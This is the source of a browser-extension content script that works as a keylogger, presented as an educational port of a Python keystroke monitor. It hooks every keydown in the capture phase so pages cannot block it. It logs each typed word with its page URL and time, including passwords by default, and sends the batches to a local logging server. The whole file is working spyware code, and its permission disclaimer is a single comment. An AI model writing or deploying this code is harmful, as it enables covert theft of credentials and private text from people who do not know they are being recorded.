/**
 * Keystroke Monitor Demo - educational browser-extension port of main.py.
 *
 * main.py keeps the characters of the current word in `word`, closes the word
 * on Space, Enter or Tab, and appends "timestamp | word" lines to log.txt in
 * batches of 10. This script does the same, but sends the batches to
 * background.js, which POSTs them to server.py (127.0.0.1:5000). The server
 * appends them to log.txt.
 *
 *   on_press(key)   -> onKeyDown(event)
 *   flush_word()    -> closeWord()
 *   write_file()    -> flushLines() -> background.js -> POST /log -> log.txt
 *   on_release(Esc) -> Esc key, or the Stop button in the popup
 *
 * Differences on purpose:
 *   - Only keystrokes inside web pages are visible (no OS-wide hook).
 *   - Everything typed is recorded, including password fields. Set
 *     SKIP_PASSWORD_FIELDS to true to ignore them.
 *   - Ctrl/Alt/Meta shortcuts and IME composition are ignored because they do
 *     not produce plain text.
 *   - event.key already applies Shift/CapsLock, so no manual uppercase step.
 *
 * Use it only on a browser and pages you own or have permission to test.
 */

(() => {
  "use strict";

  const api = globalThis.browser ?? globalThis.chrome;

  const MAX_LINES = 10; // same batch size as main.py
  const IDLE_FLUSH_MS = 2000; // close and send the current word after a pause
  const MAX_URL_LENGTH = 500; // keep log lines readable on very long URLs
  const ENABLED_KEY = "enabled";
  const SKIP_PASSWORD_FIELDS = false; // true = do not record password inputs

  let enabled = false;
  let word = []; // characters of the word currently being typed
  let wordTime = null; // timestamp of the first character of that word
  let wordUrl = null; // URL of the page where that word started
  let lines = []; // finished lines waiting to be sent
  let idleTimer = null;

  let outbox = []; // batches waiting for the background script
  let pumping = false;
  let retryTimer = null;

  /* ------------------------------------------------------------------ */
  /* Event handling                                                      */
  /* ------------------------------------------------------------------ */

  function timestamp() {
    const d = new Date();
    const pad = (n) => String(n).padStart(2, "0");
    return (
      `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ` +
      `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`
    );
  }

  function pageUrl() {
    const url = location.href;
    return url.length > MAX_URL_LENGTH ? `${url.slice(0, MAX_URL_LENGTH)}…` : url;
  }

  function isPasswordField(target) {
    if (!(target instanceof Element)) return false;
    return Boolean(
      target.closest(
        'input[type="password"], [autocomplete="current-password"], [autocomplete="new-password"]'
      )
    );
  }

  function shouldIgnore(event) {
    // Ignore IME composition and dead keys.
    if (event.isComposing || event.keyCode === 229) return true;

    // Ignore shortcuts, but not AltGr (which reports Ctrl+Alt on some layouts).
    const altGr = event.getModifierState?.("AltGraph") ?? false;
    if (!altGr && (event.ctrlKey || event.metaKey || event.altKey)) return true;

    return SKIP_PASSWORD_FIELDS && isPasswordField(event.target);
  }

  function onKeyDown(event) {
    if (!enabled) return;

    // Mirrors on_release(Esc) in main.py: save everything and stop.
    if (event.key === "Escape") {
      flushAll();
      api.storage.local.set({ [ENABLED_KEY]: false }).catch(() => {});
      return;
    }

    if (shouldIgnore(event)) return;

    const key = event.key;

    if (key === "Backspace") {
      word.pop();
      return;
    }

    // main.py closes the word on Space, Enter and Tab.
    if (key === " " || key === "Enter" || key === "Tab") {
      closeWord();
      scheduleIdleFlush();
      return;
    }

    // Printable characters only; named keys (Shift, Ctrl, arrows, F1...)
    // are dropped, like the startswith("Key.") filter in main.py.
    if ([...key].length !== 1) return;

    if (word.length === 0) {
      wordTime = timestamp();
      wordUrl = pageUrl();
    }
    word.push(key);
    scheduleIdleFlush();
  }

  /* ------------------------------------------------------------------ */
  /* Buffering (word -> lines -> background -> server -> log.txt)        */
  /* ------------------------------------------------------------------ */

  function closeWord() {
    if (word.length === 0) return;

    // timestamp | page URL | word
    lines.push(`${wordTime} | ${wordUrl} | ${word.join("")}`);
    word = [];
    wordTime = null;
    wordUrl = null;

    if (lines.length >= MAX_LINES) flushLines();
  }

  function flushAll() {
    closeWord();
    flushLines();
  }

  function scheduleIdleFlush() {
    clearTimeout(idleTimer);
    // The word in progress is closed after a short pause, so the last word
    // typed (without Space/Enter/Tab) is not lost when the user stops typing.
    idleTimer = setTimeout(flushIdle, IDLE_FLUSH_MS);
  }

  function flushIdle() {
    closeWord();
    flushLines();
  }

  function flushLines() {
    clearTimeout(idleTimer);
    idleTimer = null;

    if (lines.length === 0) return;

    outbox.push(lines);
    lines = [];
    pumpOutbox();
  }

  async function pumpOutbox() {
    if (pumping) return;
    pumping = true;

    try {
      while (outbox.length > 0) {
        const response = await api.runtime.sendMessage({
          type: "append-log",
          lines: outbox[0],
        });

        if (!response || !response.ok) {
          throw new Error(response?.error || "background did not accept the log");
        }

        outbox.shift();
      }
    } catch (error) {
      // The background queues batches while the server is down, so this only
      // happens if the extension itself was reloaded or messaging failed.
      console.warn("[keystroke-demo] could not send the log, retrying:", error);
      clearTimeout(retryTimer);
      retryTimer = setTimeout(() => {
        retryTimer = null;
        pumpOutbox();
      }, 3000);
    } finally {
      pumping = false;
    }
  }

  /* ------------------------------------------------------------------ */
  /* Enable / disable                                                    */
  /* ------------------------------------------------------------------ */

  function setEnabled(value) {
    if (enabled === value) return;

    if (enabled) flushAll(); // same as flush_all() when main.py stops

    enabled = value;
    clearTimeout(idleTimer);
    idleTimer = null;

    if (!enabled) {
      word = [];
      wordTime = null;
      wordUrl = null;
      lines = [];
    }
  }

  api.storage.local
    .get({ [ENABLED_KEY]: false })
    .then((stored) => setEnabled(Boolean(stored[ENABLED_KEY])))
    .catch(() => {});

  api.storage.onChanged.addListener((changes, area) => {
    if (area !== "local" || !(ENABLED_KEY in changes)) return;
    setEnabled(Boolean(changes[ENABLED_KEY].newValue));
  });

  /* ------------------------------------------------------------------ */
  /* Wiring                                                              */
  /* ------------------------------------------------------------------ */

  // Capture phase: pages that stop propagation cannot hide their keys.
  window.addEventListener("keydown", onKeyDown, true);

  // Switching tabs/windows, opening the popup or closing the tab must not
  // lose the pending word.
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "hidden") flushAll();
  });
  window.addEventListener("blur", flushAll);
  window.addEventListener("pagehide", flushAll);
})();
